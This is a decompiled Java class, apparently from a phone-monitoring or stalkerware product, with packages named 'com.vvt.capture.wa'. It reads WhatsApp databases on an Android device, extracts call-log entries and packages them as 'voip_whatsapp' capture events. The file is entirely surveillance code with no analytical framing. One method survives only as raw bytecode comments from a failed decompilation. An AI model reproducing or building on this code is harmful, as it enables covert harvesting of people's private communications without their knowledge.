package com.vvt.al.g;

import android.os.SystemClock;
import com.vvt.ag.b;
import com.vvt.capture.wa.limited.LimitedWhatsAppQuery;
import com.vvt.capture.wa.voip.calllog.limited.LimitedWhatsAppCallLogQuery;

public class c
  extends com.vvt.al.a
  implements com.vvt.al.c
{
  private static final boolean c = com.vvt.ak.a.a;
  private static final boolean d = com.vvt.ak.a.e;
  
  public c(String paramString1, String paramString2, com.vvt.h.d paramd, com.vvt.base.a parama)
  {
    super(paramString1, paramString2, parama);
  }
  
  /* Error */
  private void a(String paramString1, String paramString2, String paramString3)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 4
    //   3: getstatic 16	com/vvt/al/FxFileObserverWorker/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   6: istore 5
    //   8: iload 5
    //   10: ifeq +3 -> 13
    //   13: ldc 27
    //   15: astore 6
    //   17: iconst_1
    //   18: istore 7
    //   20: iload 7
    //   22: anewarray 30	java/lang/Object
    //   25: astore 8
    //   27: iconst_0
    //   28: istore 9
    //   30: aconst_null
    //   31: astore 10
    //   33: ldc 32
    //   35: astore 11
    //   37: aload 8
    //   39: iconst_0
    //   40: aload 11
    //   42: aastore
    //   43: aload 6
    //   45: aload 8
    //   47: invokestatic 38	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   50: astore 11
    //   52: ldc 40
    //   54: astore 6
    //   56: iconst_1
    //   57: istore 7
    //   59: iload 7
    //   61: anewarray 30	java/lang/Object
    //   64: astore 8
    //   66: iconst_0
    //   67: istore 9
    //   69: aconst_null
    //   70: astore 10
    //   72: ldc 42
    //   74: astore 12
    //   76: aload 8
    //   78: iconst_0
    //   79: aload 12
    //   81: aastore
    //   82: aload 6
    //   84: aload 8
    //   86: invokestatic 38	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   89: astore 13
    //   91: ldc 44
    //   93: astore 14
    //   95: aload_2
    //   96: invokestatic 49	com/vvt/capture/wa/removeFromPath/removeFromPath:a	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   99: astore 6
    //   101: aload_3
    //   102: invokestatic 49	com/vvt/capture/wa/removeFromPath/removeFromPath:a	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   105: astore 15
    //   107: aload 6
    //   109: ifnull +224 -> 333
    //   112: aload 15
    //   114: ifnull +219 -> 333
    //   117: ldc 51
    //   119: astore 8
    //   121: iconst_0
    //   122: istore 9
    //   124: aconst_null
    //   125: astore 10
    //   127: iconst_0
    //   128: istore 16
    //   130: aconst_null
    //   131: astore 12
    //   133: aload 6
    //   135: aload 8
    //   137: aconst_null
    //   138: aload 11
    //   140: aconst_null
    //   141: aconst_null
    //   142: aconst_null
    //   143: aload 13
    //   145: aload 14
    //   147: invokevirtual 57	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   150: astore 11
    //   152: aload 11
    //   154: ifnull +492 -> 646
    //   157: iconst_0
    //   158: istore 7
    //   160: aconst_null
    //   161: astore 8
    //   163: aload 15
    //   165: aload 11
    //   167: iconst_0
    //   168: invokestatic 62	com/vvt/capture/wa/voip/calllog/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;Landroid/database/Cursor;Z)Ljava/util/ArrayList;
    //   171: astore 8
    //   173: aload 8
    //   175: invokevirtual 68	java/util/ArrayList:size	()I
    //   178: istore 9
    //   180: iload 9
    //   182: ifle +132 -> 314
    //   185: iconst_0
    //   186: istore 9
    //   188: aconst_null
    //   189: astore 10
    //   191: aload 8
    //   193: iconst_0
    //   194: invokevirtual 72	java/util/ArrayList:get	(I)Ljava/lang/Object;
    //   197: astore 8
    //   199: aload 8
    //   201: checkcast 74	com/vvt/capture/wa/a/a
    //   204: astore 8
    //   206: aload_0
    //   207: invokespecial 78	com/vvt/al/FxFileObserverWorker/MyUncaughtExceptionHandler:FxFileObserverWorker	()Lcom/vvt/im/events/info/d;
    //   210: astore 10
    //   212: aload 8
    //   214: astore 4
    //   216: aload 10
    //   218: astore 8
    //   220: aload 8
    //   222: astore 17
    //   224: aload 4
    //   226: astore 8
    //   228: aload 17
    //   230: astore 4
    //   232: aload 6
    //   234: ifnull +8 -> 242
    //   237: aload 6
    //   239: invokevirtual 82	android/database/sqlite/SQLiteDatabase:close	()V
    //   242: aload 15
    //   244: ifnull +8 -> 252
    //   247: aload 15
    //   249: invokevirtual 82	android/database/sqlite/SQLiteDatabase:close	()V
    //   252: aload 11
    //   254: ifnull +10 -> 264
    //   257: aload 11
    //   259: invokeinterface 85 1 0
    //   264: aload 8
    //   266: ifnull +37 -> 303
    //   269: aload 4
    //   271: ifnull +32 -> 303
    //   274: aload_0
    //   275: aload 8
    //   277: invokevirtual 88	com/vvt/al/FxFileObserverWorker/MyUncaughtExceptionHandler:a	(Lcom/vvt/im/events/info/ICallLogData;)Z
    //   280: istore 5
    //   282: iload 5
    //   284: ifeq +182 -> 466
    //   287: getstatic 94	com/vvt/events/FxVoipCategory:WHATSAPP	Lcom/vvt/events/FxVoipCategory;
    //   290: astore 6
    //   292: aload_0
    //   293: aload_1
    //   294: aload 8
    //   296: aload 4
    //   298: aload 6
    //   300: invokevirtual 97	com/vvt/al/FxFileObserverWorker/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Lcom/vvt/im/events/info/ICallLogData;Lcom/vvt/im/events/info/d;Lcom/vvt/events/FxVoipCategory;)V
    //   303: getstatic 16	com/vvt/al/FxFileObserverWorker/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   306: istore 5
    //   308: iload 5
    //   310: ifeq +3 -> 313
    //   313: return
    //   314: getstatic 21	com/vvt/al/FxFileObserverWorker/MyUncaughtExceptionHandler:d	Z
    //   317: istore 7
    //   319: iload 7
    //   321: ifeq +3 -> 324
    //   324: iconst_0
    //   325: istore 7
    //   327: aconst_null
    //   328: astore 8
    //   330: goto -110 -> 220
    //   333: getstatic 21	com/vvt/al/FxFileObserverWorker/MyUncaughtExceptionHandler:d	Z
    //   336: istore 7
    //   338: iload 7
    //   340: ifeq +3 -> 343
    //   343: iconst_0
    //   344: istore 7
    //   346: aconst_null
    //   347: astore 8
    //   349: aconst_null
    //   350: astore 11
    //   352: goto -120 -> 232
    //   355: astore 6
    //   357: iconst_0
    //   358: istore 7
    //   360: aconst_null
    //   361: astore 8
    //   363: iconst_0
    //   364: istore 5
    //   366: aconst_null
    //   367: astore 6
    //   369: iconst_0
    //   370: istore 9
    //   372: aconst_null
    //   373: astore 10
    //   375: aconst_null
    //   376: astore 11
    //   378: getstatic 21	com/vvt/al/FxFileObserverWorker/MyUncaughtExceptionHandler:d	Z
    //   381: istore 16
    //   383: iload 16
    //   385: ifeq +3 -> 388
    //   388: aload 11
    //   390: ifnull +8 -> 398
    //   393: aload 11
    //   395: invokevirtual 82	android/database/sqlite/SQLiteDatabase:close	()V
    //   398: aload 10
    //   400: ifnull +8 -> 408
    //   403: aload 10
    //   405: invokevirtual 82	android/database/sqlite/SQLiteDatabase:close	()V
    //   408: aload 6
    //   410: ifnull -146 -> 264
    //   413: aload 6
    //   415: invokeinterface 85 1 0
    //   420: goto -156 -> 264
    //   423: astore 6
    //   425: aconst_null
    //   426: astore 15
    //   428: aconst_null
    //   429: astore 11
    //   431: aload 11
    //   433: ifnull +8 -> 441
    //   436: aload 11
    //   438: invokevirtual 82	android/database/sqlite/SQLiteDatabase:close	()V
    //   441: aload 15
    //   443: ifnull +8 -> 451
    //   446: aload 15
    //   448: invokevirtual 82	android/database/sqlite/SQLiteDatabase:close	()V
    //   451: aload 4
    //   453: ifnull +10 -> 463
    //   456: aload 4
    //   458: invokeinterface 85 1 0
    //   463: aload 6
    //   465: athrow
    //   466: getstatic 16	com/vvt/al/FxFileObserverWorker/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   469: istore 5
    //   471: iload 5
    //   473: ifeq +3 -> 476
    //   476: aload_1
    //   477: invokestatic 103	com/vvt/shell/ShellUtil:i	(Ljava/lang/String;)V
    //   480: goto -177 -> 303
    //   483: astore 8
    //   485: aconst_null
    //   486: astore 15
    //   488: aload 6
    //   490: astore 11
    //   492: aload 8
    //   494: astore 6
    //   496: goto -65 -> 431
    //   499: astore 8
    //   501: aload 6
    //   503: astore 11
    //   505: aload 8
    //   507: astore 6
    //   509: goto -78 -> 431
    //   512: astore 8
    //   514: aload 11
    //   516: astore 4
    //   518: aload 6
    //   520: astore 11
    //   522: aload 8
    //   524: astore 6
    //   526: goto -95 -> 431
    //   529: astore 8
    //   531: aload 6
    //   533: astore 4
    //   535: aload 10
    //   537: astore 15
    //   539: aload 8
    //   541: astore 6
    //   543: goto -112 -> 431
    //   546: astore 8
    //   548: iconst_0
    //   549: istore 7
    //   551: aconst_null
    //   552: astore 8
    //   554: iconst_0
    //   555: istore 9
    //   557: aconst_null
    //   558: astore 10
    //   560: aload 6
    //   562: astore 11
    //   564: iconst_0
    //   565: istore 5
    //   567: aconst_null
    //   568: astore 6
    //   570: goto -192 -> 378
    //   573: astore 8
    //   575: iconst_0
    //   576: istore 7
    //   578: aconst_null
    //   579: astore 8
    //   581: aload 15
    //   583: astore 10
    //   585: aload 6
    //   587: astore 11
    //   589: iconst_0
    //   590: istore 5
    //   592: aconst_null
    //   593: astore 6
    //   595: goto -217 -> 378
    //   598: astore 8
    //   600: iconst_0
    //   601: istore 7
    //   603: aconst_null
    //   604: astore 8
    //   606: aload 15
    //   608: astore 10
    //   610: aload 11
    //   612: astore 17
    //   614: aload 6
    //   616: astore 11
    //   618: aload 17
    //   620: astore 6
    //   622: goto -244 -> 378
    //   625: astore 10
    //   627: aload 15
    //   629: astore 10
    //   631: aload 11
    //   633: astore 17
    //   635: aload 6
    //   637: astore 11
    //   639: aload 17
    //   641: astore 6
    //   643: goto -265 -> 378
    //   646: iconst_0
    //   647: istore 7
    //   649: aconst_null
    //   650: astore 8
    //   652: goto -420 -> 232
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	655	0	this	MyUncaughtExceptionHandler
    //   0	655	1	paramString1	String
    //   0	655	2	paramString2	String
    //   0	655	3	paramString3	String
    //   1	533	4	localObject1	Object
    //   6	585	5	bool1	boolean
    //   15	284	6	localObject2	Object
    //   355	1	6	localException1	Exception
    //   367	47	6	localObject3	Object
    //   423	66	6	localObject4	Object
    //   494	148	6	localObject5	Object
    //   18	630	7	bool2	boolean
    //   25	337	8	localObject6	Object
    //   483	10	8	localObject7	Object
    //   499	7	8	localObject8	Object
    //   512	11	8	localObject9	Object
    //   529	11	8	localObject10	Object
    //   546	1	8	localException2	Exception
    //   552	1	8	localObject11	Object
    //   573	1	8	localException3	Exception
    //   579	1	8	localObject12	Object
    //   598	1	8	localException4	Exception
    //   604	47	8	localObject13	Object
    //   28	528	9	i	int
    //   31	578	10	localObject14	Object
    //   625	1	10	localException5	Exception
    //   629	1	10	localObject15	Object
    //   35	603	11	localObject16	Object
    //   74	58	12	str1	String
    //   89	55	13	str2	String
    //   93	53	14	str3	String
    //   105	523	15	localObject17	Object
    //   128	256	16	bool3	boolean
    //   222	418	17	localObject18	Object
    // Exception table:
    //   from	to	target	type
    //   20	25	355	java/lang/Exception
    //   40	43	355	java/lang/Exception
    //   45	50	355	java/lang/Exception
    //   59	64	355	java/lang/Exception
    //   79	82	355	java/lang/Exception
    //   84	89	355	java/lang/Exception
    //   95	99	355	java/lang/Exception
    //   20	25	423	finally
    //   40	43	423	finally
    //   45	50	423	finally
    //   59	64	423	finally
    //   79	82	423	finally
    //   84	89	423	finally
    //   95	99	423	finally
    //   101	105	483	finally
    //   145	150	499	finally
    //   333	336	499	finally
    //   167	171	512	finally
    //   173	178	512	finally
    //   193	197	512	finally
    //   199	204	512	finally
    //   206	210	512	finally
    //   314	317	512	finally
    //   378	381	529	finally
    //   101	105	546	java/lang/Exception
    //   145	150	573	java/lang/Exception
    //   333	336	573	java/lang/Exception
    //   167	171	598	java/lang/Exception
    //   173	178	598	java/lang/Exception
    //   193	197	598	java/lang/Exception
    //   199	204	598	java/lang/Exception
    //   314	317	598	java/lang/Exception
    //   206	210	625	java/lang/Exception
  }
  
  private e f()
  {
    String str1 = com.vvt.capture.wa.limited.a.a();
    String str2 = c();
    String str3 = e();
    e locale = new com/vvt/al/g/e;
    String str4 = null;
    locale.<init>(this, null);
    if (str1 != null)
    {
      str4 = this.a;
      str4 = LimitedWhatsAppCallLogQuery.a(str1, str2, str4, str3);
      boolean bool1 = b.a(str4);
      if (!bool1)
      {
        bool1 = c;
        if (bool1) {}
        String str5 = this.a;
        str1 = LimitedWhatsAppCallLogQuery.b(str1, str2, str5, str3);
        boolean bool2 = b.a(str1);
        if (!bool2)
        {
          bool2 = c;
          if (bool2) {}
          bool2 = true;
          locale.a = bool2;
          locale.b = str4;
          locale.c = str1;
        }
      }
    }
    for (;;)
    {
      return locale;
      boolean bool3 = d;
      if (bool3)
      {
        continue;
        bool3 = d;
        if (bool3)
        {
          continue;
          bool3 = d;
          if (!bool3) {}
        }
      }
    }
  }
  
  private com.vvt.im.events.info.d g()
  {
    boolean bool1 = c;
    if (bool1) {}
    Object localObject = c();
    String str = e();
    str = LimitedWhatsAppQuery.a(this.a, (String)localObject, str);
    localObject = com.vvt.capture.wa.full.a.a((String)localObject, str, null);
    boolean bool2 = c;
    if (bool2) {}
    bool2 = c;
    if (bool2) {}
    return (com.vvt.im.events.info.d)localObject;
  }
  
  public String a()
  {
    return "voip_whatsapp";
  }
  
  public void a(String paramString, long paramLong)
  {
    boolean bool1 = c;
    if (bool1) {}
    bool1 = c;
    if (bool1) {}
    long l = 10000L;
    SystemClock.sleep(l);
    Object localObject = f();
    boolean bool2 = ((e)localObject).a;
    if (bool2)
    {
      String str = ((e)localObject).b;
      localObject = ((e)localObject).c;
      a(paramString, str, (String)localObject);
    }
    for (;;)
    {
      d();
      bool1 = c;
      if (bool1) {}
      return;
      bool1 = d;
      if (!bool1) {}
    }
  }
  
  public String b()
  {
    return "voip_whatsapp";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/FxFileObserverWorker/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */